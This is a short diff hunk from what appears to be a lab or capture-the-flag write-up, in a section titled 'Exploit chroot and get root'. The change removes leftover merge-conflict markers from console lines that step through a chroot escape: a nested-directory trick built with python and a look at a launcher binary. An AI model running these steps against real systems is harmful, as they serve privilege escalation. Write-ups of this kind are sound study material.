@@ -391,10 +391,7 @@ int main() {
 ### Exploit chroot and get root
 
 ```console
-<<<<<<< HEAD
 bash-4.1$ cd /tmp/chroot
-=======
->>>>>>> e9eb999dff67169c736bdebc81d3d526ee84abad
 bash-4.1$ cd $(python -c "print 'a/'*100")
 
 bash-4.1$ ls -al /tmp/chroot/bin/launcher 
